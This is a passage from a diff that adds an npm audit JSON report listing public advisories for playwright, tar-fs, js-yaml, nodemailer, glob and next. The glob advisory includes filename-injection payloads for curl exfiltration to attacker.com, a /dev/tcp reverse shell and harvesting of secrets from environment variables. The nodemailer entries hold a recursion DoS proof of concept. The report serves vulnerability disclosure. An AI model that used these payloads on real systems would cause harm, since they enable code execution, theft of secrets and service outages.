improper SSL certificate validation (CWE-295: Improper Certificate Validation). Any user or automation running these scripts is at risk of arbitrary code execution as root/admin, system compromise, data theft, or persistent malware installation. The risk is especially severe because browser packages are installed with elevated privileges and the scripts may be used in CI/CD or developer environments.\n\n### Fix\n\n - https://github.com/microsoft/playwright/commit/72c62d840247d9defd87c6beb0344d456794b570\n - https://github.com/microsoft/playwright/pull/37532\n - https://github.com/microsoft/playwright/releases/tag/v1.56.0\n\n### Credit\n\n- This vulnerability was uncovered by tooling by [Socket](https://socket.dev/)\n- This vulnerability was confirmed by @evilpacket\n- This vulnerability was reported by @JLLeitschuh at Socket\n\n### Disclosure\n - September 10th, 2025 - Disclosed to Microsoft privately via https://github.com/microsoft/playwright/security/advisories/GHSA-gx27-2j22-qcx8\n - September 11th, 2025 - Reported to Microsoft via MSRC Researcher Portal - https://msrc.microsoft.com/report/vulnerability/VULN-162854\n - September 11th, 2025 - Microsoft closed report as \"Complete - N/A\"\n - September 18th, 2025 - Following a [LinkedIn Post](https://www.linkedin.com/posts/jonathan-leitschuh_its-a-sad-state-of-the-world-when-i-acknowledge-activity-7374601182117511168--wnI?utm_source=social_share_send&utm_medium=member_desktop_web&rcm=ACoAAA0SLMUBScBUspIv0-LQ1ecAwsqt5l81eG4)",
+      "reported_by": null,
+      "title": "Playwright downloads and installs browsers without verifying the authenticity of the SSL certificate",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-59288"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "playwright",
+      "vulnerable_versions": "<1.55.1",
+      "github_advisory_id": "GHSA-7mvr-c777-76hp",
+      "recommendation": "Upgrade to version 1.55.1 or later",
+      "patched_versions": ">=1.55.1",
+      "updated": "2025-10-24T20:05:50.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-347"
+      ],
+      "url": "https://github.com/advisories/GHSA-7mvr-c777-76hp"
+    },
+    "1109532": {
+      "findings": [
+        {
+          "version": "2.1.3",
+          "paths": [
+            ".>sharp>prebuild-install>tar-fs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/mafintosh/tar-fs/security/advisories/GHSA-vj76-c3g6-qr5v\n- https://nvd.nist.gov/vuln/detail/CVE-2025-59343\n- https://github.com/mafintosh/tar-fs/commit/0bd54cdf06da2b7b5b95cd4b062c9f4e0a8c4e09\n- https://lists.debian.org/debian-lts-announce/2025/09/msg00028.html\n- https://github.com/advisories/GHSA-vj76-c3g6-qr5v",
+      "created": "2025-09-24T18:57:04.000Z",
+      "id": 1109532,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n v3.1.0, v2.1.3, v1.16.5 and below\n\n### Patches\nHas been patched in 3.1.1, 2.1.4, and 1.16.6\n\n### Workarounds\nYou can use the ignore option to ignore non files/directories.\n\n```js\n  ignore (_, header) {\n    // pass files & directories, ignore e.g. symlinks\n    return header.type !== 'file' && header.type !== 'directory'\n  }\n```\n\n### Credit\nReported by: Mapta / BugBunny_ai",
+      "reported_by": null,
+      "title": "tar-fs has a symlink validation bypass if destination directory is predictable with a specific tarball",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-59343"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar-fs",
+      "vulnerable_versions": ">=2.0.0 <2.1.4",
+      "github_advisory_id": "GHSA-vj76-c3g6-qr5v",
+      "recommendation": "Upgrade to version 2.1.4 or later",
+      "patched_versions": ">=2.1.4",
+      "updated": "2025-11-03T21:34:36.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-61"
+      ],
+      "url": "https://github.com/advisories/GHSA-vj76-c3g6-qr5v"
+    },
+    "1109534": {
+      "findings": [
+        {
+          "version": "3.1.0",
+          "paths": [
+            ".>sharp>tar-fs"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/mafintosh/tar-fs/security/advisories/GHSA-vj76-c3g6-qr5v\n- https://nvd.nist.gov/vuln/detail/CVE-2025-59343\n- https://github.com/mafintosh/tar-fs/commit/0bd54cdf06da2b7b5b95cd4b062c9f4e0a8c4e09\n- https://lists.debian.org/debian-lts-announce/2025/09/msg00028.html\n- https://github.com/advisories/GHSA-vj76-c3g6-qr5v",
+      "created": "2025-09-24T18:57:04.000Z",
+      "id": 1109534,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n v3.1.0, v2.1.3, v1.16.5 and below\n\n### Patches\nHas been patched in 3.1.1, 2.1.4, and 1.16.6\n\n### Workarounds\nYou can use the ignore option to ignore non files/directories.\n\n```js\n  ignore (_, header) {\n    // pass files & directories, ignore e.g. symlinks\n    return header.type !== 'file' && header.type !== 'directory'\n  }\n```\n\n### Credit\nReported by: Mapta / BugBunny_ai",
+      "reported_by": null,
+      "title": "tar-fs has a symlink validation bypass if destination directory is predictable with a specific tarball",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-59343"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "tar-fs",
+      "vulnerable_versions": ">=3.0.0 <3.1.1",
+      "github_advisory_id": "GHSA-vj76-c3g6-qr5v",
+      "recommendation": "Upgrade to version 3.1.1 or later",
+      "patched_versions": ">=3.1.1",
+      "updated": "2025-11-03T21:34:36.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-61"
+      ],
+      "url": "https://github.com/advisories/GHSA-vj76-c3g6-qr5v"
+    },
+    "1109802": {
+      "findings": [
+        {
+          "version": "4.1.0",
+          "paths": [
+            ".>@eslint/eslintrc>js-yaml"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64718\n- https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879\n- https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266\n- https://github.com/advisories/GHSA-mh29-5h37-fv8m",
+      "created": "2025-11-14T14:29:48.000Z",
+      "id": 1109802,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+      "reported_by": null,
+      "title": "js-yaml has prototype pollution in merge (<<)",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64718"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "js-yaml",
+      "vulnerable_versions": ">=4.0.0 <4.1.1",
+      "github_advisory_id": "GHSA-mh29-5h37-fv8m",
+      "recommendation": "Upgrade to version 4.1.1 or later",
+      "patched_versions": ">=4.1.1",
+      "updated": "2025-11-17T15:20:44.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-1321"
+      ],
+      "url": "https://github.com/advisories/GHSA-mh29-5h37-fv8m"
+    },
+    "1109804": {
+      "findings": [
+        {
+          "version": "6.9.16",
+          "paths": [
+            ".>@payloadcms/email-nodemailer>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87\n- https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626\n- https://nvd.nist.gov/vuln/detail/CVE-2025-13033\n- https://access.redhat.com/security/cve/CVE-2025-13033\n- https://bugzilla.redhat.com/show_bug.cgi?id=2402179\n- https://github.com/advisories/GHSA-mm7p-fcc7-pg87",
+      "created": "2025-10-07T13:42:02.000Z",
+      "id": 1109804,
+      "npm_advisory_id": null,
+      "overview": "The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target.\n\nPayload: `\"xclow3n@gmail.com x\"@internal.domain`\nUsing the following code to send mail\n```\nconst nodemailer = require(\"nodemailer\");\n\nlet transporter = nodemailer.createTransport({\n  service: \"gmail\",\n  auth: {\n    user: \"\",\n    pass: \"\",\n  },\n});\n\nlet mailOptions = {\n  from: '\"Test Sender\" <your_email@gmail.com>', \n  to: \"\\\"xclow3n@gmail.com x\\\"@internal.domain\",\n  subject: \"Hello from Nodemailer\",\n  text: \"This is a test email sent using Gmail SMTP and Nodemailer!\",\n};\n\ntransporter.sendMail(mailOptions, (error, info) => {\n  if (error) {\n    return console.log(\"Error: \", error);\n  }\n  console.log(\"Message sent: %s\", info.messageId);\n\n});\n\n\n(async () => {\n  const parser = await import(\"@sparser/email-address-parser\");\n  const { EmailAddress, ParsingOptions } = parser.default;\n  const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true) */);\n\n  if (!parsed) {\n    console.error(\"Invalid email address:\", mailOptions.to);\n    return;\n  }\n\n  console.log(\"Parsed email:\", {\n    address: `${parsed.localPart}@${parsed.domain}`,\n    local: parsed.localPart,\n    domain: parsed.domain,\n  });\n})();\n```\n\nRunning the script and seeing how this mail is parsed according to RFC\n\n```\nParsed email: {\n  address: '\"xclow3n@gmail.com x\"@internal.domain',\n  local: '\"xclow3n@gmail.com x\"',\n  domain: 'internal.domain'\n}\n```\n\nBut the email is sent to `xclow3n@gmail.com`\n\n<img width=\"2128\" height=\"439\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d\" />\n\n\n### Impact:\n\n-    Misdelivery / Data leakage: Email is sent to psres.net instead of test.com.\n\n-    Filter evasion: Logs and anti-spam systems may be bypassed by hiding recipients inside quoted local-parts.\n\n-    Potential compliance issue: Violates RFC 5321/5322 parsing rules.\n\n-    Domain based access control bypass in downstream applications using your library to send mails\n\n### Recommendations\n\n-    Fix parser to correctly treat quoted local-parts per RFC 5321/5322.\n\n-    Add strict validation rejecting local-parts containing embedded @ unless fully compliant with quoting.",
+      "reported_by": null,
+      "title": "Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-13033"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": "<7.0.7",
+      "github_advisory_id": "GHSA-mm7p-fcc7-pg87",
+      "recommendation": "Upgrade to version 7.0.7 or later",
+      "patched_versions": ">=7.0.7",
+      "updated": "2025-11-17T17:29:27.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-mm7p-fcc7-pg87"
+    },
+    "1109843": {
+      "findings": [
+        {
+          "version": "11.0.3",
+          "paths": [
+            ".>glob"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2\n- https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64756\n- https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f\n- https://github.com/advisories/GHSA-5j98-mcp5-4vw2",
+      "created": "2025-11-17T17:38:56.000Z",
+      "id": 1109843,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+      "reported_by": null,
+      "title": "glob CLI: Command injection via -c/--cmd executes matches with shell:true",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-64756"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "glob",
+      "vulnerable_versions": ">=11.0.0 <11.1.0",
+      "github_advisory_id": "GHSA-5j98-mcp5-4vw2",
+      "recommendation": "Upgrade to version 11.1.0 or later",
+      "patched_versions": ">=11.1.0",
+      "updated": "2025-11-19T02:30:53.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cwe": [
+        "CWE-78"
+      ],
+      "url": "https://github.com/advisories/GHSA-5j98-mcp5-4vw2"
+    },
+    "1111074": {
+      "findings": [
+        {
+          "version": "6.9.16",
+          "paths": [
+            ".>@payloadcms/email-nodemailer>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v\n- https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150\n- https://github.com/advisories/GHSA-rcmh-qjqh-p98v",
+      "created": "2025-12-01T20:44:25.000Z",
+      "id": 1111074,
+      "npm_advisory_id": null,
+      "overview": "### Summary\nA DoS can occur that immediately halts the system due to the use of an unsafe function.\n\n### Details\nAccording to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.\nHowever, the code implemented for this flattening process can be exploited by malicious input and triggers DoS\n\nRFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.\nAt the following location in lib/addressparser/index.js:\n\nhttps://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90\n\nthere is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:\n\n```g0: g1: g2: g3: ... gN: victim@example.com;```\n\nBecause no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern\n`addressparser → _handleAddress → addressparser → ...`\nfor each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.\n\nThe problematic code section is as follows:\n```js\nif (isGroup) {\n    ...\n    if (data.group.length) {\n        let parsedGroup = addressparser(data.group.join(',')); // <- boom!\n        parsedGroup.forEach(member => {\n            if (member.group) {\n                groupMembers = groupMembers.concat(member.group);\n            } else {\n                groupMembers.push(member);\n            }\n        });\n    }\n}\n```\n`data.group` is expected to contain members separated by commas, but in the attacker’s payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.\n\n### PoC\n\n```\nconst nodemailer = require('nodemailer');\n\nfunction buildDeepGroup(depth) {\n  let parts = [];\n  for (let i = 0; i < depth; i++) {\n    parts.push(`g${i}:`);\n  }\n  return parts.join(' ') + ' user@example.com;';\n}\n\nconst DEPTH = 3000; // <- control depth \nconst toHeader = buildDeepGroup(DEPTH);\nconsole.log('to header length:', toHeader.length);\n\nconst transporter = nodemailer.createTransport({\n  streamTransport: true,\n  buffer: true,\n  newline: 'unix'\n});\n\nconsole.log('parsing start');\n\ntransporter.sendMail(\n  {\n    from: 'test@example.com',\n    to: toHeader,\n    subject: 'test',\n    text: 'test'\n  },\n  (err, info) => {\n    if (err) {\n      console.error('error:', err);\n    } else {\n      console.log('finished :', info && info.envelope);\n    }\n  }\n);\n```\nAs a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.\n\n### Impact\nThe attacker can achieve the following:\n\n1. Force an immediate crash of any server/service that uses Nodemailer\n2. Kill the backend process with a single web request\n3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”",
+      "reported_by": null,
+      "title": "Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "nodemailer",
+      "vulnerable_versions": "<=7.0.10",
+      "github_advisory_id": "GHSA-rcmh-qjqh-p98v",
+      "recommendation": "Upgrade to version 7.0.11 or later",
+      "patched_versions": ">=7.0.11",
+      "updated": "2025-12-01T20:44:26.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-703"
+      ],
+      "url": "https://github.com/advisories/GHSA-rcmh-qjqh-p98v"
+    },
+    "1111378": {
+      "findings": [
+        {
+          "version": "15.3.6",
+          "paths": [
+            ".>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-w37m-7fhw-fmv9\n- https://nextjs.org/blog/security-update-2025-12-11\n- https://www.cve.org/CVERecord?id=CVE-2025-55183\n- https://github.com/advisories/GHSA-w37m-7fhw-fmv9",
+      "created": "2025-12-11T22:49:56.000Z",
+      "id": 1111378,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React packages for versions 19.0.0, 19.0.1, 19.1.0, 19.1.1, 19.1.2, 19.2.0, and 19.2.1 and frameworks that use the affected packages, including Next.js 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-55183](https://www.cve.org/CVERecord?id=CVE-2025-55183).\n\nA malicious HTTP request can be crafted and sent to any App Router endpoint that can return the compiled source code of [Server Functions](https://react.dev/reference/rsc/server-functions). This could reveal business logic, but would not expose secrets unless they were hardcoded directly into [Server Function](https://react.dev/reference/rsc/server-functions) code.",
+      "reported_by": null,
+      "title": "Next Server Actions Source Code Exposure ",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.3.0-canary.0 <15.3.7",
+      "github_advisory_id": "GHSA-w37m-7fhw-fmv9",
+      "recommendation": "Upgrade to version 15.3.7 or later",
+      "patched_versions": ">=15.3.7",
+      "updated": "2025-12-11T22:49:56.000Z",
+      "cvss": {
+        "score": 5.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-497",
+        "CWE-502",
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-w37m-7fhw-fmv9"
+    },
+    "1111387": {
+      "findings": [
+        {
+          "version": "15.3.6",
+          "paths": [
+            ".>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-mwv6-3258-q52c\n- https://nextjs.org/blog/security-update-2025-12-11\n- https://www.cve.org/CVERecord?id=CVE-2025-55184\n- https://github.com/advisories/GHSA-mwv6-3258-q52c",
+      "created": "2025-12-11T22:49:27.000Z",
+      "id": 1111387,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability affects certain React packages for versions 19.0.0, 19.0.1, 19.1.0, 19.1.1, 19.1.2, 19.2.0, and 19.2.1 and frameworks that use the affected packages, including Next.js 15.x and 16.x using the App Router. The issue is tracked upstream as [CVE-2025-55184](https://www.cve.org/CVERecord?id=CVE-2025-55184).\n\nA malicious HTTP request can be crafted and sent to any App Router endpoint that, when deserialized, can cause the server process to hang and consume CPU. This can result in denial of service in unpatched environments.",
+      "reported_by": null,
+      "title": "Next Vulnerable to Denial of Service with Server Components",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=15.3.0-canary.0 <15.3.7",
+      "github_advisory_id": "GHSA-mwv6-3258-q52c",
+      "recommendation": "Upgrade to version 15.3.7 or later",
+      "patched_versions": ">=15.3.7",
+      "updated": "2025-12-11T22:49:30.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-400",
+        "CWE-502",
+        "CWE-1395"
+      ],
+      "url": "https://github.com/advisories/GHSA-mwv6-3258-q52c"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 4,
+      "moderate": 8,
+      "high": 5,
+      "critical": 0
+    },
+    "dependencies": 1065,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1065
+  }
+}
+
